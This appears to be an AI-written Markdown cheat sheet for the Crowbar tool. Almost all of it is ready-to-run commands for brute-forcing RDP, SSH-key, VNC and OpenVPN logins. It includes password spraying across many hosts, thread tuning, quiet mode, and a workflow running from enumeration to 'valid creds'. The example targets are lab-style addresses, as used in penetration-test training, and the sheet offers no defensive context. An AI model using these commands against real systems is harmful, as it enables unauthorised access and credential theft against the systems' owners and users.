
Here you go — clean, structured exactly like your Evil-WinRM one 👇

---

# 🐦 Crowbar Command Cheat Sheet

---



> [!NOTE] TO Find RDP Sessions
> Contents



> [!info] 🧩 Basic Syntax
>
> ```bash
> crowbar -b <service> -s <target> -u <user> -c <pass>
> ```
>
> **Example**
>
> ```bash
> crowbar -b rdp -s 10.10.10.10 -u admin -c password123
> ```

---

> [!tip] 📂 Use Username & Password Wordlists
>
> ```bash
> crowbar -b <service> -s <target> -U users.txt -C passwords.txt
> ```
>
> **Example**
>
> ```bash
> crowbar -b rdp -s 10.10.10.10 -U users.txt -C passwords.txt
> ```

---

> [!info] 🌐 Multiple Targets from File
>
> ```bash
> crowbar -b <service> -S targets.txt -U users.txt -C passwords.txt
> ```
>
> 💡 Useful for spraying across many hosts

---

> [!tip] ⚡ Increase Threads (Speed)
>
> ```bash
> crowbar -b <service> -s <target> -U users.txt -C passwords.txt -n 20
> ```
>
> ⚠️ Be careful — some services (like RDP) hate high concurrency

---

> [!info] 🔌 Specify Custom Port
>
> ```bash
> crowbar -b <service> -s <target> -u user -c pass -p <port>
> ```
>
> **Example**
>
> ```bash
> crowbar -b sshkey -s 10.10.10.10 -u root -k id_rsa -p 2222
> ```

---

> [!tip] 🔑 SSH Key Brute Force
>
> ```bash
> crowbar -b sshkey -s <target> -u <user> -k <keyfile>
> ```
>
> **Example**
>
> ```bash
> crowbar -b sshkey -s 10.10.10.10 -u root -k ./keys/
> ```

---

> [!info] 🖥️ RDP Brute Force
>
> ```bash
> crowbar -b rdp -s <target> -U users.txt -C passwords.txt
> ```

---

> [!tip] 🔐 VNC Key Attack
>
> ```bash
> crowbar -b vnckey -s <target> -k <keyfile>
> ```

---

> [!info] 🔗 OpenVPN Brute Force
>
> ```bash
> crowbar -b openvpn -s <target> -U users.txt -C passwords.txt -m config.ovpn
> ```

---

> [!tip] 🔍 Discover Open Ports Before Attack
>
> ```bash
> crowbar -b rdp -S targets.txt -d
> ```

---

> [!info] 🧾 Logging Attempts & Results
>
> ```bash
> crowbar -b <service> -s <target> -U users.txt -C passwords.txt -l attempts.log -o results.txt
> ```

---

> [!tip] 🧹 Quiet Mode (Only Show Success)
>
> ```bash
> crowbar -b <service> -s <target> -U users.txt -C passwords.txt -q
> ```

---

> [!warning] 🐞 Debug / Verbose Mode
>
> ```bash
> crowbar -b <service> -s <target> -U users.txt -C passwords.txt -v
> crowbar -b <service> -s <target> -U users.txt -C passwords.txt -D
> ```

---

# 🧠 Mental Model

> [!quote] 🎯 Think Like This
>
> ```text
> Target → Service → Credentials → Threads → Success
> ```
>
> Typical flow:
>
> ```bash
> enum → pick service (rdp/ssh/vnc) → crowbar brute → valid creds
> ```

---

# ⚔️ When to Use Crowbar

> [!info]
>
> ```text
> ✔ Lightweight brute forcing
> ✔ Good for RDP + SSH key attacks
> ✔ Simpler than Hydra/Medusa
> ✖ Limited protocols (compared to NetExec/CrackMapExec)
> ```

---


